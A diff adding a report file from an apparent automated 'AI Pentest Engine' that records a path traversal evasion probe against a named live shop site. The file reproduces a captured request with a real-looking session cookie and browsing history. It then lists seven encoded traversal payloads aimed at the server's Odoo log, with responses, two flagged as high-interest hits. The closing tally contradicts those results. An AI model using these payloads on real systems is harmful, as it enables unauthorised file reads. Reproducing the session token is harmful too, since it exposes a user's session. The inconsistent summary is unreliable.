@@ -1,0 +1,91 @@
+=== AI Pentest Engine v1.0 Report ===
+Date: ۱۴۰۴/۷/۱۷, ۱۴:۰۹:۵۱
+Attack Module: Path Traversal Evasion Probe
+Packet Source: packet.txt
+
+--- Packet Summary ---
+Method: GET
+URL: https://sinour.ir/web/image/4766-dff164cd/Slider-02.jpg
+Headers:
+  Host: sinour.ir
+  Cookie: visitor_uuid=4af9414b0f6941eb8a5075343dd4f8c9; frontend_lang=fa_IR; tz=Asia/Tehran; session_id=e2456fef21f3812ea52a6512ff7405647bae50b7; comparelist_product_ids=[192,253]; im_livechat_history=["/blog/3","/blog/3?search=11&order=name+asc&tag=","/blog/2","/blog/5/114","/blog/6","/blog","/about-us","/contactus","/my/home","/shop/cart","/shop/cart?code_not_available=1","/my/orders","/my/orders?sortby=name","/website/search?search=yakh&order=name+asc","/sexi"]
+  Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+  Accept-Language: en-US
+  Sec-Ch-Ua-Mobile: ?0
+  Upgrade-Insecure-Requests: 1
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+  Sec-Ch-Ua-Platform: "Windows"
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Dest: empty
+  Accept-Encoding: gzip, deflate, br
+  Priority: u=0, i
+Body:
+  
+
+--- Requests Executed ---
+[evasion-0]
+Payload: ..%2f..%2f..%2f..%2fvar%2flog%2fodoo%2fodoo.log
+Part: path
+Status Code: 400
+Response Length: 157 bytes
+Interesting: none
+Notes: Evasion attempt → Status 400, Length 157
+
+[evasion-1]
+Payload: ..%252f..%252f..%252f..%252fvar%252flog%252fodoo%252fodoo.log
+Part: path
+Status Code: 200
+Response Length: 5812 bytes
+Interesting: high
+Notes: Evasion attempt → Status 200, Length 5812
+
+[evasion-2]
+Payload: %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/odoo/odoo.log
+Part: path
+Status Code: 400
+Response Length: 157 bytes
+Interesting: none
+Notes: Evasion attempt → Status 400, Length 157
+
+[evasion-3]
+Payload: ../../../../var/log/odoo/odoo.log%00.jpg
+Part: path
+Status Code: 400
+Response Length: 157 bytes
+Interesting: none
+Notes: Evasion attempt → Status 400, Length 157
+
+[evasion-4]
+Payload: 4766/Slider-02.jpg/../../../../var/log/odoo/odoo.log
+Part: path
+Status Code: 404
+Response Length: 68206 bytes
+Interesting: none
+Notes: Evasion attempt → Status 404, Length 68206
+
+[evasion-5]
+Payload: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/odoo/odoo.log
+Part: path
+Status Code: 400
+Response Length: 157 bytes
+Interesting: none
+Notes: Evasion attempt → Status 400, Length 157
+
+[evasion-6]
+Payload: %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afvar%c0%aflog%c0%afodoo%c0%afodoo.log
+Part: path
+Status Code: 200
+Response Length: 5812 bytes
+Interesting: high
+Notes: Evasion attempt → Status 200, Length 5812
+
+--- Summary ---
+Total Requests Sent: 7
+Exploited: 0
+Unpredictable: 0
+Low Impact: 0
+No Effect: 5
+
+Report saved by AI Pentest Engine v1.0.
